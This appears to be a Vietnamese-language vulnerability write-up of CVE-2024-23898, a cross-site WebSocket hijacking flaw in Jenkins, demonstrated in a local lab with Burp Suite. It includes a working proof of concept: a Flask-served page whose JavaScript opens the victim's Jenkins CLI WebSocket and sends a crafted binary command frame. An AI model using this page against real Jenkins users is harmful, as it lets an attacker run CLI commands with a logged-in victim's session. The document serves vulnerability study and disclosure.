# Phân tích lỗ hổng CVE-2024-23898 - CSWSH Jenkins

--- 

## Phân tích CVE-2024-23898 trong Jenkins 

### Mô tả: 

- CVE-2024-23898 là một lỗ hổng nguy hiểm (score NVD: 8.8 HIGH) trong các phiên bản 2.217 → 2.441 (và LTS 2.222.1 → 2.426.2) của Jenkins, thuộc dạng kiểu lỗ hổng Cross-site WebSocket hijacking (CSWSH). Bản chất lỗ hổng này là do Jenkins có một giao diện dòng lệnh (command line interface - CLI) gọi là `jenkins-cli` và hoạt động trên một endpoint là `/cli`, thông qua giao thức WebSocket.

- Vấn đề chính nằm ở chỗ, tại các phiên bản này Jenkins không thực hiện validate header `Orgin` cho các request WebSocket handshake kết nối đến endpoint `/eli`. Một yếu tố phụ khác là Jenkins không đặt explicit SameSite attribute cho session cookies, nói nôm na là `SameSite` là thuộc tính của cookie quy định khi nào trình duyệt được phép gửi cookie đi kèm với các request từ trang khác (cross-site) và khi cookie không có thuộc tính `SameSite` được set, thì trình duyệt quyết định hành vi mặc định.
  
- Hậu quả một trang web bên ngoài có thể mở một kết nối WebSocket tới `/cli` và nếu trình duyệt gửi cookie phiên (và/hoặc remember cookie) thì server sẽ coi đó là kết nối của người dùng đã đăng nhập. Và ta có thể lợi dụng kết nối này để khai thác.

  <img width="1919" height="800" alt="image" src="https://github.com/user-attachments/assets/bffad2e0-0764-4b19-bb0c-dd36ac1e566d" />


### Phân tích và demo:

- Bản chất gốc rễ của lỗ hổng là nằm ỏ giao thức WebSocket tại endpoint `/cli`, do đó ta cần phân tích request WebSocket handshake của Jenkins tại endpoint này.

- Đầu tiên giả dụ, ta đăng nhập với tài khoản Jenkins `admin` (password có thể lấy bằng cách truy cập lệnh `sudo docker exec -it jenkins_ssh bash -c "cat /var/jenkins_home/secrets/initialAdminPassword 2>/dev/null || true"` trên terminal nếu build Jenkins bằng docker):

  <img width="1919" height="849" alt="Screenshot 2025-10-04 185929" src="https://github.com/user-attachments/assets/645d1c3e-cb72-4242-af7a-d54cc65d0e65" />

  (optional tính năng `Keep me signed in/Remember me` khi đăng nhập).

- Để có thể phân tích, ta cần dùng Jenkins CLI qua WebSocket để bắt reqquest và xem WebSocket interactions tại `/cli`. Để tạo kết nối WebSocket ta có thể sử dụng `jenkins-cli.jar`, vì Jenkins sử dụng nó để cho phép chạy lệnh từ terminal. Tuy nhiên để Burp Suite có thể bắt request WebSocket handshake và các messages ta cần ep JVM dùng proxy và xoá `nonProxyHosts` (buộc Java không exempt localhost, nên nó sẽ gửi request qua proxy). Em dùng port 8081 cho Burp Suite:

  ```bash
  java \
  -Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=8081 \
  -Dhttps.proxyHost=127.0.0.1 -Dhttps.proxyPort=8081 \
  -Dhttp.nonProxyHosts="" \
  -Dhttps.nonProxyHosts="" \
  -jar jenkins-cli.jar \
  -s http://127.0.0.1:8080 \
  -auth admin:APITOKEN \
  -webSocket help
  ```

  Trong đó `-s http://127.0.0.1:8080` là Jenkins URL đang chạy, `-auth user:APITOKEN` = authentication (lấy token trên UI Jenkins: User avatar → Configure → API Token → Generate / Copy). `help` là lệnh thực hiện (help    là lệnh xem full list commands của Jenkins)

  <img width="1914" height="837" alt="image" src="https://github.com/user-attachments/assets/4a21c563-17cf-4fa8-baf0-2f8f5ba5bbcd" />

  &rarr; Websocket interactions trong WebSocket history trong Burp:

  <img width="1917" height="804" alt="image" src="https://github.com/user-attachments/assets/0dfb02c8-3b22-4065-aada-d87236d004c2" />

  &rarr; Request WebSocket mà Burp bắt được:

  <img width="1919" height="803" alt="image" src="https://github.com/user-attachments/assets/ef30e5d6-3339-42cc-913f-7fad8f4ed9fe" />

  Kết quả thấy được `GET /cli/ws HTTP/1.1` → đây là WebSocket upgrade request tới endpoint CLI (/cli/ws), đúng chỗ nguy cơ lỗ hổng rất cao.

  Điểm đặc biệt ở đây là handshake được chấp nhận (HTTP/1.1 101 Switching Protocols) dù không thấy token CSRF hay biện pháp chống CSWSH rõ ràng.

  Ngoài ra request có sử dụng header Authorization chứa Basic auth (base64), để gửi _session/auth credential_ trong handshake. Tuy nhiên, ta có thể thử test bypass bằng cách gửi request với session cookie (và/hoặc        remember me cookie) mà ta sẽ thực hiện cross-site với nạn nhân vì đây là request HTTP GET Upgrade — browser sẽ gửi cookie tự động cho cùng domain (trong trường hợp server không validate origin).

  Do đó ta sẽ test kết nối WebSocket này của Jenkins có bị cross-site hijacking không (CSWSH) và server có thực hiện validate header `Origin` trong request?

  Thực hiện tạo một web page local HTML nhúng JS chạy trên port 5000 với mục đích thực hiện lừa nạn nhân click truy cập trang dẫn, source code như sau:

  ```html
  from flask import Flask, render_template_string

  app = Flask(__name__)
  
  @app.route('/')
  def index():
      # Define the HTML page with embedded JavaScript
      html_content = """
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>WebSocket Test</title>
          <script>
              // Set the WebSocket URL and origin
              const url = "ws://localhost:8080/cli/ws";
  
              // Create the first WebSocket connection
              const ws1 = new WebSocket(url);
              
              ws1.binaryType = 'arraybuffer';
              
              ws1.onopen = function() {
                  console.log("WebSocket Connected");
                  const command = new TextEncoder().encode("who-am-i");
                  console.log(command);
  
                  // Define the start and end frames
                  const start = new Uint8Array([0x00, 0x00, 0x08]);
                  const end = new Uint8Array([0x02, 0x00, 0x05, 0x55, 0x54, 0x46, 0x2d, 0x38, 0x01, 0x00, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53]);
  
                  // Combine the frames
                  const commandFrame = new Uint8Array(start.length + command.length + end.length);
                  commandFrame.set(start);
                  commandFrame.set(command, start.length);
                  commandFrame.set(end, start.length + command.length);
  
                  // Send the frames
                  ws1.send(commandFrame);
                  console.log("Command sent (ws1)");
  
                  ws1.send(new Uint8Array([0x03]));  		
  		            let i = 0;
                  ws1.onmessage = async function(event) {
                      try {
                    			console.log('onmessage received, typeof:', typeof event.data,
                    				    'is ArrayBuffer?', event.data instanceof ArrayBuffer,
                    				    'is Blob?', event.data instanceof Blob);
                    
                    			let arrayBuffer;
                    
                    			if (event.data instanceof ArrayBuffer) {
                    			    arrayBuffer = event.data;
                    			} else if (event.data instanceof Blob) {
                    			    arrayBuffer = await event.data.arrayBuffer();
                    			} else if (typeof event.data === 'string') {
                    			    console.log(`Message ${i} (text): ${event.data}`);
                    			    i += 1;
                    			    return;
                    			} else {
                    			    console.warn('Unknown message type received:', event.data);
                    			    return;
                    			}
                    
                    			const decoder = new TextDecoder('utf-8');
                    			const decodedMessage = decoder.decode(arrayBuffer);
                    			console.log(`Message ${i}: ${decodedMessage}`);
                    			i += 1;
  
                      } catch (err) {
                    			  console.error('Error decoding message:', err);
                      }
                  };
  
                  ws1.onclose = function() {
                      console.log("First WebSocket closed");
                  };
              };
          </script>
      </head>
      <body>
          <h1>WebSocket Connection Test</h1>
          <p>Open your browser's console to see WebSocket interactions.</p>
      </body>
      </html>
      """
      # Render the HTML content as the response
      return render_template_string(html_content)
    
  if __name__ == '__main__':
      app.run(debug=True, host='0.0.0.0', port=5000)
  ```

  Khi nạn nhân thực hiện mở trang web độc hại mà trong khi vẫn đang đăng nhập ở hệ thống Jenkins, thì từ browser của nạn nhân sẽ chạy mã JS trên trang web độc hại và thực hiện mở một phiên kết nối WebSocket tự động       `const ws1 = new WebSocket(url)` tới `ws://localhost:8080/cli/ws`, tức là endpoint `/cli/ws` của Jenkins. Cùng với trong phiên WebSocket này là gửi câu lệnh `who-am-i` được mã hóa sang bytes (UTF-8) với các quá         trình biến đổi dưới dạng khung nhị phân để tạo ra một binary message có cấu trúc mà server mong đợi.

  Giả sử, nạn nhân đang truy cập Jenkins và thực hiện mở web page dộc của ta như sau:

  <img width="1919" height="799" alt="image" src="https://github.com/user-attachments/assets/372f6c13-98c1-4138-9a0c-c512b4757079" />

  Thực hiện kiểm tra Burp Suite, ta thấy được request WebSocket handshake mà web page độc hại gửi đến cho server Jenkins:

  <img width="1918" height="582" alt="image" src="https://github.com/user-attachments/assets/ac5a0acc-bdb5-4f32-a5be-bbfe4ed55194" />

  &rarr; Server Jenkins phản hổi `101 Switching Protocols` &rarr; quá trình WebSocket handshake trên diễn ra thành công.

  &rarr; Và có thể thấy header `Origin` của request lúc này là: `http://localhost:5000` (tức là URL của trang web độc hại của ta) &rarr; **server không validate header `Orrigin`**

  &rarr; Trong request dược gửi có thêm header `Cookie` là _session cookie (cookie phiên đăng nhập hiện tại của nạn nhân) và remember me cookie_ &rarr; Browser của nạn nhân đã tự động gửi cho phiên kết nối WebSocket      này do Jenkins không explicit SamSite attribute như đã đề cập ở trên.

  Ta có thể thấy WebSocket interactions trong WebSocket history, hoặc trong console browser ta sẽ thấy toàn bộ log đã được ghi lại:

  <img width="1919" height="797" alt="image" src="https://github.com/user-attachments/assets/139981bf-7752-49ea-9d44-d5124e35e2a6" />

  &rarr; Toàn bộ các messages do server trả về từ câu lệnh `who-am-i`.

  &rarr; Kết luận với request có `cookie session` lụm được của nạn nhân và server không kiểm tra `Origin` hay yêu cầu thêm auth trong WS handshake, trang cross-site có thể mở socket thay nạn nhân và gửi các câu           lệnh CLI tương tác với service nội bộ.

  &rarr; **Tồn tại lỗ hổng CSWSH tại endpoint `/cli/ws/` sử dụng giao thức WebSocket của Jenkins.**

  



  

  


  
  

  
